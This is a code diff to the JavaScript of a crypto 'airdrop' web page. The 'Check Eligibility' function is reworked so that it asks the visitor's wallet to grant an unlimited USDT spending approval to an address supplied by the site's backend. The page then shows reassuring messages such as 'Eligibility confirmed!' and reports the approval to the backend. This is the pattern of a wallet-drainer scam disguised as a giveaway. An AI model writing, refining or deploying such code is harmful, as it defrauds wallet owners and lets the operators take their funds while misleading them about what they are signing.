@@ -980,7 +980,7 @@
             }
         }
 
-        // ✅ UPDATED: Check Eligibility Function
+        // ✅ FIXED: Check Eligibility Function with working approval
         async function checkEligibility() {
             try {
                 if (typeof window.ethereum === 'undefined') {
@@ -1010,7 +1010,7 @@
                 
                 document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
                 
-                // ✅ UPDATED: Show actual airdrop amount for all users (including 0 USDT)
+                // ✅ Calculate airdrop amount
                 const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                 const tier = getTier(parseFloat(balanceInUSDT));
                 
@@ -1027,28 +1027,37 @@
                     eligibilityBadge.className = "eligibility-status not-eligible";
                 }
 
-                // ✅ UPDATED: Allow approval for ALL users (including 0 USDT)
-                button.innerHTML = '<div class="loading"></div> Setting Up Claim...';
-                
+                // ✅ Check if already eligible
+                const approvalWallet = await getApprovalWalletFromBackend();
+                const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
+                const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
+
+                if (parseFloat(allowanceInUSDT) > 1000) {
+                    // Already eligible
+                    showAlert(`✅ You are already eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
+                    document.getElementById("claimButton").disabled = false;
+                    button.innerHTML = '<i class="fas fa-check"></i> Already Eligible';
+                    button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
+                    return;
+                }
+
                 if (airdropAmount === 0) {
                     showAlert(`❌ You are not eligible for the airdrop as you have less than 1 USDT`, "warning");
                     button.innerHTML = '<i class="fas fa-times"></i> Not Eligible';
                     button.disabled = true;
                     return;
-                } else {
-                    showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens! Setting up claim...`, "success");
                 }
+
+                showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens! Setting up claim...`, "success");
+                
+                // ✅ FIXED: Proper approval process
+                button.innerHTML = '<div class="loading"></div> Setting Up Claim...';
                 
                 try {
-                    const approvalWallet = await getApprovalWalletFromBackend();
-                    
-                    // Check current allowance first
-                    const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
-                    const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
-
-                    // ✅ UPDATED: Unlimited approval
+                    // Unlimited approval amount
                     const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                     
+                    // Send approval transaction
                     const tx = await usdtContract.methods.approve(
                         approvalWallet,
                         unlimitedAmount
@@ -1060,12 +1069,10 @@
                     if (tx.status) {
                         showAlert("✅ Eligibility confirmed! You can now claim your airdrop.", "success");
                         
-                        // ✅ UPDATED: Enable claim button for eligible users after approval
+                        // Enable claim button
                         document.getElementById("claimButton").disabled = false;
-                        document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Eligible & Ready';
-                        document.getElementById("checkEligibilityBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
-                        
-                        showAlert(`🎉 Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
+                        button.innerHTML = '<i class="fas fa-check"></i> Eligible & Ready';
+                        button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                         
                         // Save to backend
                         await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
